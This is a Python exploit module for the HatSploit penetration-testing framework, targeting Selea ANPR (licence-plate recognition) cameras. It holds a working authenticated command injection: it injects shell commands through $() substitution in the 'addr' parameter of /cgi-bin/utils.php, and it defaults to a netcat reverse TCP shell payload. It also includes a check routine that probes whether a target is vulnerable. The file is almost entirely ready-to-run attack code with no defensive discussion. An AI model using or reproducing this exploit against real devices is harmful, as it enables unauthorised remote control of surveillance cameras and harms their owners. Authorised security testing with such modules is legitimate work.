"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient


class HatSploitModule(Module, Handler, HTTPClient):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "Selea ANPR Camera Authenticated RCE",
            'Module': "exploit/linux/selea/anpr_authenticated_rce",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'LiquidWorm (liquidworm) - vulnerability researcher',
            ],
            'Description': "Selea ANPR Camera authenticated remote code execution.",
            'Platform': "linux",
            'Rank': "high",
        }

        self.payload = {
            'Value': "unix/generic/netcat_reverse_tcp",
            'Architectures': ['armle', 'generic'],
            'Platforms': ['linux', 'unix'],
            'Actions': ['execute', 'drop'],
            'Types': None,
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': 81,
                'Type': "port",
                'Required': True,
            },
            'USERNAME': {
                'Description': "Username for authorization.",
                'Value': "admin",
                'Type': None,
                'Required': True,
            },
            'PASSWORD': {
                'Description': "Password for authorization.",
                'Value': None,
                'Type': None,
                'Required': True,
            },
        }

    def exploit(self, remote_host, remote_port, username, password, command):
        self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path=f'/cgi-bin/utils.php?cmd=addr_check&addr=1.3.3.7\\ $({command})&type=port&port=80',
            auth=(username, password),
            output=False,
        )

    def check(self):
        remote_host, remote_port, username, password = self.parse_options(self.options)

        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path=f'/cgi-bin/utils.php?cmd=addr_check&addr=1.3.3.7\\ $(echo)&type=port&port=80',
            auth=(username, password),
            output=False,
        )

        if not response or response.status_code != 200:
            return False

        return True

    def run(self):
        remote_host, remote_port, username, password = self.parse_options(self.options)

        self.module_handle(
            module=self,
            sender=self.exploit,
            args={
                'remote_host': remote_host,
                'remote_port': remote_port,
                'username': username,
                'password': password,
            },
        )
